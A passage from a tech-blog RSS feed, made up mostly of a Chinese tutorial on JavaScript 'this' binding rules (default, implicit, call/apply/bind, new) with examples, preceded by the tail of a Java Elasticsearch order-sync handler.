        orderEsService.<span class="hljs-title function_">save</span>(<span class="hljs-string">"order"</span>, (<span class="hljs-title class_">Long</span>)orderMap.<span class="hljs-title function_">get</span>(<span class="hljs-string">"id"</span>)+<span class="hljs-string">""</span>,orderMap );
        log.<span class="hljs-title function_">info</span>(<span class="hljs-string">"ES插入订单数据{}"</span>,orderMap);
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">updateHandler</span>(<span class="hljs-params">TransmitDTO transmitDTO</span>) {
        <span class="hljs-title class_">Map</span>&lt;<span class="hljs-title class_">String</span>, <span class="hljs-title class_">Serializable</span>&gt; orderMap = transmitDTO.<span class="hljs-title function_">getAfter</span>();
        orderEsService.<span class="hljs-title function_">update</span>(<span class="hljs-string">"order"</span>,(<span class="hljs-title class_">Long</span>)orderMap.<span class="hljs-title function_">get</span>(<span class="hljs-string">"id"</span>)+<span class="hljs-string">""</span>,orderMap );
        log.<span class="hljs-title function_">info</span>(<span class="hljs-string">"ES修改订单数据{}"</span>,orderMap);
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">deleteHandler</span>(<span class="hljs-params">TransmitDTO transmitDTO</span>) {
        <span class="hljs-title class_">Map</span>&lt;<span class="hljs-title class_">String</span>, <span class="hljs-title class_">Serializable</span>&gt; orderMap = transmitDTO.<span class="hljs-title function_">getBefore</span>();
        orderEsService.<span class="hljs-title function_">delete</span>(<span class="hljs-string">"order"</span>,(<span class="hljs-title class_">Long</span>)orderMap.<span class="hljs-title function_">get</span>(<span class="hljs-string">"id"</span>)+<span class="hljs-string">""</span>);
        log.<span class="hljs-title function_">info</span>(<span class="hljs-string">"ES删除订单数据{}"</span>,orderMap);
    }
}
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<p>​</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[快 2026 年了，谁还在为 this 挠头？看完这篇让你彻底从懵圈到精通]]></title>    <link>https://juejin.cn/post/7575807729722359842</link>    <guid>https://juejin.cn/post/7575807729722359842</guid>    <pubDate>2025-11-23T08:00:36.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575807729722359842" data-draft-id="7575104251866284042" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="快 2026 年了，谁还在为 this 挠头？看完这篇让你彻底从懵圈到精通"/> <meta itemprop="keywords" content="JavaScript,前端,Node.js"/> <meta itemprop="datePublished" content="2025-11-23T08:00:36.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="风止何安啊"/> <meta itemprop="url" content="https://juejin.cn/user/2517239724512420"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            快 2026 年了，谁还在为 this 挠头？看完这篇让你彻底从懵圈到精通
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2517239724512420/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    风止何安啊
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-23T08:00:36.000Z" title="Sun Nov 23 2025 08:00:36 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-23
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读7分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#595959;font-size:15px;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(60,10,30,.04) 3%,transparent 0),linear-gradient(1turn,rgba(60,10,30,.04) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body p{color:#595959;font-size:15px;line-height:2;font-weight:400}.markdown-body p+p{margin-top:16px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin:0;color:#135ce0}.markdown-body h1{position:relative;text-align:center;font-size:22px;margin:50px 0}.markdown-body h1:before{position:absolute;content:"";top:-10px;left:50%;width:32px;height:32px;transform:translateX(-50%);background-size:100% 100%;opacity:.36;background-repeat:no-repeat;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABfVBMVEX///8Ad/8AgP8AgP8AgP8Aff8AgP8Af/8AgP8AVf8Af/8Af/8AgP8AgP8Af/8Afv8AAP8Afv8Afv8Aef8AgP8AdP8Afv8AgP8AgP8Acf8Ae/8AgP8Af/8AgP8Af/8Af/8AfP8Afv8AgP8Af/8Af/8Afv8Afv8AgP8Afv8AgP8Af/8Af/8AgP8AgP8Afv8AgP8Af/8AgP8AgP8AgP8Ae/8Afv8Af/8AgP8Af/8AgP8Af/8Af/8Aff8Af/8Abf8AgP8Af/8AgP8Af/8Af/8Afv8AgP8AgP8Afv8Afv8AgP8Af/8Aff8AgP8Afv8AgP8Aff8AgP8AfP8AgP8Ae/8AgP8Af/8AgP8AgP8AgP8Afv8AgP8AgP8AgP8Afv8AgP8AgP8AgP8AgP8AgP8Af/8AgP8Af/8Af/8Aev8Af/8AgP8Aff8Afv8AgP8AgP8AgP8Af/8AgP8Af/8Af/8AgP8Afv8AgP8AgP8AgP8AgP8Af/8AeP8Af/8Af/8Af//////rzEHnAAAAfXRSTlMAD7CCAivatxIDx5EMrP19AXdLEwgLR+6iCR/M0yLRzyFF7JupSXn8cw6v60Q0QeqzKtgeG237HMne850/6Qeq7QaZ+WdydHtj+OM3qENCMRYl1B3K2U7wnlWE/mhlirjkODa9FN/BF7/iNV/2kASNZpX1Wlf03C4stRGxgUPclqoAAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4gEaBzgZ4yeM3AAAAT9JREFUOMvNUldbwkAQvCAqsSBoABE7asSOBRUVVBQNNuy9996789+9cMFAMHnVebmdm+/bmdtbQv4dOFOW2UjPzgFyLfo6nweKfIMOBYWwFtmMPGz2Yj2pJI0JDq3udJW6VVbmKa9I192VQFV1ktXUAl5NB0cd4KpnORqsEO2ZIRpF9gJfE9Dckqq0KuZt7UAH5+8EPF3spjsRpCeQNO/tA/qDwIDA+OCQbBoKA8NOdjMySgcZGVM6jwcgRuUiSs0nlPFNSrEpJfU0jTLD6llqbvKxei7OzvkFNQohi0vAsj81+MoqsCaoPOQFgus/1LyxichW+hS2JWCHZ7VlF9jb187pIAYcHiViHAMnp5mTjJ8B5xeEXF4B1ze/fTh/C0h398DDI9HB07O8ci+vRBdvdGnfP4gBuM8vw7X/G3wDmFhFZEdxzjMAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDEtMjZUMDc6NTY6MjUrMDE6MDA67pVWAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTAxLTI2VDA3OjU2OjI1KzAxOjAwS7Mt6gAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAAWdEVYdFRpdGxlAGp1ZWppbl9sb2dvIGNvcHlxapmKAAAAV3pUWHRSYXcgcHJvZmlsZSB0eXBlIGlwdGMAAHic4/IMCHFWKCjKT8vMSeVSAAMjCy5jCxMjE0uTFAMTIESANMNkAyOzVCDL2NTIxMzEHMQHy4BIoEouAOoXEXTyQjWVAAAAAElFTkSuQmCC)}.markdown-body h2{position:relative;font-size:20px;border-left:4px solid;padding:0 0 0 10px;margin:30px 0}.markdown-body h3{font-size:16px}.markdown-body ul{list-style:disc outside;margin-left:2em;margin-top:1em}.markdown-body li{line-height:2;color:#595959}.markdown-body img.loaded{margin:0 auto;display:block}.markdown-body blockquote{background:#fff9f9;margin:2em 0;padding:2px 20px;border-left:4px solid #b2aec5}.markdown-body blockquote p{color:#666;line-height:2}.markdown-body a{color:#036aca;border-bottom:1px solid rgba(3,106,202,.8);font-weight:400;text-decoration:none}.markdown-body em strong,.markdown-body strong{color:#036aca}.markdown-body hr{border-top:1px solid #135ce0}.markdown-body pre{overflow:auto}.markdown-body code,.markdown-body pre{overflow:auto;position:relative;line-height:1.75;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body table{border-collapse:collapse;margin:1rem 0;overflow-x:auto}.markdown-body table td,.markdown-body table th{border:1px solid #dfe2e5;padding:.6em 1em}.markdown-body table tr{border-top:1px solid #dfe2e5}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">前言</h2>
<p>各位 前端er 们，谁还没被 JavaScript 里的 <code>this</code> 虐过？这玩意简直就是编程界的 <strong>“变脸大师”</strong>，翻脸比孙猴子还快。一会儿是全局对象，一会儿是某个实例，一会儿又跟着调用场景改头换面，这不就是活生生的 “百变马丁” 吗？写代码时总被它搞得晕头转向，调试半天就因为 <code>this</code> 指向不对，真有种 <strong>“一杯茶一包烟，一个this改一天”</strong> 的崩溃感。如果你还搞不懂 JavaScript 里面的 <code>this</code>,那这篇将让你搞定原理并且拿捏用法，把那些绕人的绑定规则掰扯得明明白白！</p>
<h3 data-id="heading-1">一、为什么要有 this？—— 让代码 “优雅到飞起”</h3>
<p>想象一下，你写了个函数，想在不同对象上复用它。要是没有<code>this</code>，就得每次手动传对象参数，想想都麻烦！<code>this</code>就像个 “智能代词”，悄咪咪地帮我们传递对象引用。通俗来说就是 <code>this</code> 提供了一种更优雅的方式来隐式的传递一个对象引用，可以让代码更简洁易于复用。</p>
<p>比如下面这两种写法：</p>
<pre><code class="hljs language-scss" lang="scss">function <span class="hljs-built_in">identify</span>(context) {
    return context<span class="hljs-selector-class">.name</span><span class="hljs-selector-class">.toUpperCase</span>();
}
function <span class="hljs-attribute">speak</span>(context) {
    <span class="hljs-selector-tag">var</span> greet = 'hello, <span class="hljs-selector-tag">I</span> am ' + <span class="hljs-built_in">identify</span>(context);
    console<span class="hljs-selector-class">.log</span>(greet);
}
<span class="hljs-selector-tag">var</span> myname = {
    name: <span class="hljs-string">'henry'</span>
}
<span class="hljs-attribute">speak</span>(myname);
</code></pre>
<p>我们定义 <code>identify</code> 函数接收对象参数，返回其 <code>name</code> 大写值；<code>speak</code> 函数接收对象，调用 <code>identify</code> 拼接问候语并打印；最后创建含 <code>name</code> 的 <code>myname</code> 对象，传给 <code>speak</code> 执行，输出 <code>hello, I am HENRY</code>。核心是<strong>手动传递</strong>对象参数实现复用。</p>
<p>输出结果：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1cf3a10c989a48f8bbad9aa01b590edb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aOO5q2i5L2V5a6J5ZWK:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764489636&amp;x-signature=ndRrkutsgIwH9NLuQh1awex5y9I%3D" alt="image.png" loading="lazy"/></p>
<p>结果没错，<code>henry</code> 确确实实大写了，但每次都要手动传参你自己不嫌麻烦吗？这时候我们请出大名鼎鼎的--<code>this</code>！</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">identify</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>.<span class="hljs-title function_">toUpperCase</span>();
}
<span class="hljs-keyword">function</span> <span class="hljs-title function_">speak</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">var</span> greet = <span class="hljs-string">'hello, I am '</span> + identify.<span class="hljs-title function_">call</span>(<span class="hljs-variable language_">this</span>);
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(greet);
}
<span class="hljs-keyword">var</span> myname = {
    <span class="hljs-attr">name</span>: <span class="hljs-string">'henry'</span>
}
speak.<span class="hljs-title function_">call</span>(myname);
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a11d00940b6d4722a15f8e2ae7f6adc0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aOO5q2i5L2V5a6J5ZWK:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764489636&amp;x-signature=mXiVLKZgc7NIU3nAsGcl%2Bo3FJYs%3D" alt="image.png" loading="lazy"/></p>
<p>诶，你会发现，我2个函数都没有传参，但是都输出了结果。这里有2个关键点：</p>
<ul>
<li>用 <code>call</code> 强制让 <code>speak</code> 的 <code>this</code> 指向 <code>myname</code>；</li>
<li><code>speak</code> 内部调用 <code>identify.call(this)</code> 时，<code>this</code> 已绑定 <code>myname</code>，因此 <code>identify</code> 也能访问 <code>myname.name</code>。</li>
</ul>
<p>至于<code>call</code>是个啥，往下看吧，嘿嘿！</p>
<h3 data-id="heading-2">二、this 用在哪？—— “代词” 的舞台</h3>
<p><code>this</code>就像 “变色龙”，在不同场景下指代不同的角色：</p>
<ul>
<li><strong>全局作用域</strong>：在浏览器里，<code>this</code>就等于<code>window</code>（就像全局舞台的 “C 位”）。比如你直接写<code>console.log(this)</code>，打印的就是<code>window</code>对象。</li>
</ul>
<p>比如我在 Google Chrome 上面写<code>console.log(this)</code>：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e07785dce0614bf5b46bec9805371ce4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aOO5q2i5L2V5a6J5ZWK:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764489636&amp;x-signature=4rEz48d8iytdOPiD6HijzftVf9o%3D" alt="image.png" loading="lazy"/></p>
<p>但在node.js里，打印出来的是<code>global</code>：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e5ee9a520ea04d23b3bb720ee6908fcd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aOO5q2i5L2V5a6J5ZWK:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764489636&amp;x-signature=gFtVWwP%2FmRm7YcT1iDOyi%2Fl88k8%3D" alt="image.png" loading="lazy"/></p>
<ul>
<li><strong>函数作用域</strong>：这就是<code>this</code>的 “主战场”了，在这它的身份变化可多了，咱们接着往下看。</li>
</ul>
<h3 data-id="heading-3">三、this 的绑定规则 —— 给 this “定规矩”</h3>
<h4 data-id="heading-4">1. 默认绑定 —— “自由散漫” 的 this</h4>
<p>当函数被<strong>独立调用</strong>时，<code>this</code>就指向<code>window</code>（严格模式下是<code>undefined</code>）。就像你一个人逛街，没对象陪~</p>
<pre><code class="hljs language-ini" lang="ini">var <span class="hljs-attr">a</span> = <span class="hljs-number">1</span><span class="hljs-comment">;</span>
function foo() {
    console.log(this.a)<span class="hljs-comment">;</span>
}
function bar() {
    var <span class="hljs-attr">a</span> = <span class="hljs-number">2</span><span class="hljs-comment">;</span>
    foo()<span class="hljs-comment">;</span>
}
bar()<span class="hljs-comment">;</span>
</code></pre>
<p>灵魂拷问：输出结果是多少？肯定有人说<code>2</code>，而且还不少！你不服了，这调用<code>bar()</code>，然后里面在调用<code>foo()</code>, 不应该根据变量提升先找<code>bar()</code>里面的<code>a = 2</code>吗？说明前面还没看懂嘻嘻，当函数被独立调用--就一个<code>foo()</code>，它就是指向全局，不管那些杂七杂八的，你就是一个人逛街，没有对象陪，所以答案就是全局的<code>a = 1</code>。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a379da0232fd4236a4907503ceacc9bc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aOO5q2i5L2V5a6J5ZWK:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764489636&amp;x-signature=t3f4m1wC6QLi%2FfJk2mzjS%2BaXUT0%3D" alt="image.png" loading="lazy"/></p>
<p>最后就是打印出了<code>1</code>，这就是函数的独立调用。</p>
<h4 data-id="heading-5">2. 隐式绑定 —— “依附对象” 的 this</h4>
<p>当函数被<strong>上下文对象调用</strong>时，<code>this</code>就绑定到这个对象上。比如：</p>
<pre><code class="hljs language-ini" lang="ini">function foo() {
    console.log(this)<span class="hljs-comment">;</span>
}
var <span class="hljs-attr">a</span> = <span class="hljs-number">1</span><span class="hljs-comment">;</span>
var <span class="hljs-attr">obj</span> = {
    foo: foo
}
obj.foo()<span class="hljs-comment">;</span>
</code></pre>
<p>好，最后的调用<code>obj.foo()</code>。首先它不是单独调用，那么就要用到<strong>上下文对象调用</strong>，咱们一句话说清核心：<code>obj.foo()</code> 是通过对象 <code>obj</code> 调用函数 <code>foo</code>，所以 <code>foo</code> 里的 <code>this</code> 直接绑定到 <code>obj</code>，最终打印 <code>obj</code> 整个对象。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2844f0af6e73459a9f0e9e1847e592e9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aOO5q2i5L2V5a6J5ZWK:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764489636&amp;x-signature=3pxzCNi920tAcZUMdGKQ6a0m2PI%3D" alt="image.png" loading="lazy"/></p>
<h4 data-id="heading-6">3. 隐式丢失 —— “层层剥离” 的 this</h4>
<p>当函数被多层对象调用时，<code>this</code>会指向<strong>最近的那个对象</strong>。是不是有点像小时候玩的游戏🎮 “击鼓传花”，传到最后花落谁家？</p>
<p>好，那看一个例子：</p>
<pre><code class="hljs language-css" lang="css">function foo() {
    console<span class="hljs-selector-class">.log</span>(this<span class="hljs-selector-class">.a</span>);
}
<span class="hljs-selector-tag">var</span> obj = {
    <span class="hljs-selector-tag">a</span>: <span class="hljs-number">1</span>,
    foo: foo
}
<span class="hljs-selector-tag">var</span> obj2 = {
    <span class="hljs-selector-tag">a</span>: <span class="hljs-number">2</span>,
    foo: obj
}
obj2<span class="hljs-selector-class">.foo</span><span class="hljs-selector-class">.foo</span>();
</code></pre>
<p>OK，懵了⊙▃⊙吧。怎么回事连续调用2次，最后输出的到底是<code>obj</code>里的还是<code>obj2</code>里的？答案是<code>obj</code>！</p>
<p><strong>关键误区提醒</strong>：</p>
<p>不要以为 <code>obj2</code> 在前面，<code>this</code> 就指向 <code>obj2</code>！</p>
<p><code>this</code> 只看 <strong>「函数执行时的直接调用者」</strong>，和外层嵌套的对象（<code>obj2</code>）无关。如果想让 <code>this</code> 指向 <code>obj2</code>，需要让 <code>obj2</code> 直接调用 <code>foo</code>（比如 <code>obj2.foo = foo; obj2.foo()</code>）。</p>
<p>就好比我们英语的 <strong>就近原则</strong>，离谁近就指向谁！</p>
<p>输出结果：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d4c5549bd148495d90237bfb9a6088ee~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aOO5q2i5L2V5a6J5ZWK:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764489636&amp;x-signature=zez8A4FLcydF5hlgtAmDnOYM6Zo%3D" alt="image.png" loading="lazy"/></p>
<h4 data-id="heading-7">4. 显式绑定 —— “强行指定” 的 this（call、apply、bind 三位好室友登场！）</h4>
<p>咱们可以把这三个方法想象成你的三个 “热心室友”：</p>
<ul>
<li><strong>call 室友</strong>：急性子，直接帮函数把<code>this</code>绑定到目标对象，参数一个个传。</li>
<li><strong>apply 室友</strong>：爱偷懒，参数打包成数组传给函数。</li>
<li><strong>bind 室友</strong>：慢性子，先绑定<code>this</code>和部分参数，返回一个 “半成品” 函数，想啥时候调用都行。</li>
</ul>

<pre><code class="hljs language-scss" lang="scss"><span class="hljs-selector-tag">var</span> obj = {
    <span class="hljs-selector-tag">a</span>: <span class="hljs-number">1</span>
}
function <span class="hljs-built_in">foo</span>(x, y) { 
    console<span class="hljs-selector-class">.log</span>(this.a, x + y);
}
foo<span class="hljs-selector-class">.call</span>(obj, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>);    <span class="hljs-comment">// call室友出马</span>
foo<span class="hljs-selector-class">.apply</span>(obj, [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>]); <span class="hljs-comment">// apply室友偷懒</span>
const bar = foo<span class="hljs-selector-class">.bind</span>(obj, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>);  
<span class="hljs-built_in">bar</span>();  <span class="hljs-comment">// bind室友慢性子</span>
</code></pre>
<ol>
<li><code>foo.call(obj, 1, 2)</code>：call 室友 “急性子”，直接把 foo 的 this 绑定到 obj，再逐个传入参数 1 和 2 → 打印 obj 的 a（1）和 1+2（3），输出：1 3；</li>
<li><code>foo.apply(obj, [1, 2])</code>：apply 室友 “爱偷懒”，同样绑定 this 到 obj，但参数要打包成数组 [1,2] 传入 → 结果和 call 一致，输出：1 3；</li>
<li><code>const bar = foo.bind(obj, 2, 3); bar()</code>：bind 室友 “慢性子”，先绑定 this 到 obj、预传参数 1 和 2，返回 “半成品” 函数 bar，调用 bar 时才执行 → 打印 obj 的 a（1）和 1+2（3），输出：1 3。</li>
</ol>
<p>结果和我们分析的一样：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5899e8ff04b94c72a74cace92a0fc362~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aOO5q2i5L2V5a6J5ZWK:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764489636&amp;x-signature=eaESjDe%2B3ptMCkYsWIDShML0ZuQ%3D" alt="image.png" loading="lazy"/></p>
<h4 data-id="heading-8">5. new 绑定 —— “实例专属” 的 this</h4>
<p><code>new</code>关键字就像个 “专属定制工厂”，专门用构造函数为新对象 “量身打造” 身份。当我们用<code>new</code>调用构造函数时，<code>this</code>会直接绑定到这个刚创建的<strong>实例对象</strong>上，相当于工厂把定制好的 “专属身份” 直接赋给了新实例。</p>
<p>但这个 “定制工厂” 有个<strong>特殊规则</strong>,分三种情况:</p>
<p><strong>情况 1：正常定制</strong> —— 返回绑定 this 的实例</p>
<p>当构造函数里没有手动<code>return</code>，或者只<code>return</code>了<code>undefined</code>（默认隐含）时，工厂会按流程完成 “定制”，返回绑定了<code>this</code>的实例对象。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Person</span>(<span class="hljs-params">name</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
}
<span class="hljs-keyword">let</span> p1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">'henry'</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(p1.<span class="hljs-property">name</span>); <span class="hljs-comment">// 输出"henry"</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(p1);      <span class="hljs-comment">// 输出Person { name: "henry" }，this绑定生效</span>
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ee9dfb60533a4af79a7d2e0889f0d080~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aOO5q2i5L2V5a6J5ZWK:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764489636&amp;x-signature=6FB358AMcLNNu%2B5m7YXSWZe5rZw%3D" alt="image.png" loading="lazy"/></p>
<p><strong>情况 2：放弃定制</strong> —— return 引用类型，返回手动指定的对象</p>
<p>如果构造函数里主动<code>return</code>了一个<strong>引用类型</strong>（比如对象、数组、函数等复杂数据），相当于你给工厂递了一个 “现成产品”，工厂会直接放弃原本的定制流程，返回这个手动指定的引用类型，原本绑定<code>this</code>的实例会被直接忽略。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Person</span>(<span class="hljs-params">name</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
    <span class="hljs-keyword">return</span> { <span class="hljs-attr">age</span>: <span class="hljs-number">20</span> }; 
}
<span class="hljs-keyword">let</span> p2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">'harvest'</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(p2);      <span class="hljs-comment">// 输出{ age: 20 }，实例被忽略</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(p2.<span class="hljs-property">name</span>); <span class="hljs-comment">// 输出undefined，拿不到原本的name属性</span>
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/17b7695c002c47f893a1903e851e6ffd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aOO5q2i5L2V5a6J5ZWK:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764489636&amp;x-signature=tQe57Um4TKAXNfVHHsj%2B4yRNAuA%3D" alt="image.png" loading="lazy"/></p>
<p><strong>情况 3：无视 return</strong> —— return 原始类型，依然返回实例</p>
<p>如果构造函数里<code>return</code>的是<strong>原始数据类型</strong>（比如数字、字符串、布尔值、null、undefined），这个<code>return</code>会被工厂 “无视”，依然按原规则返回绑定了<code>this</code>的实例对象，相当于你递了个 “无效产品”，工厂还是按定制流程来。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Person</span>(<span class="hljs-params">name</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
    <span class="hljs-keyword">return</span> <span class="hljs-number">100</span>; <span class="hljs-comment">// return 无效</span>
}
<span class="hljs-keyword">let</span> p3 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">'henry'</span>);
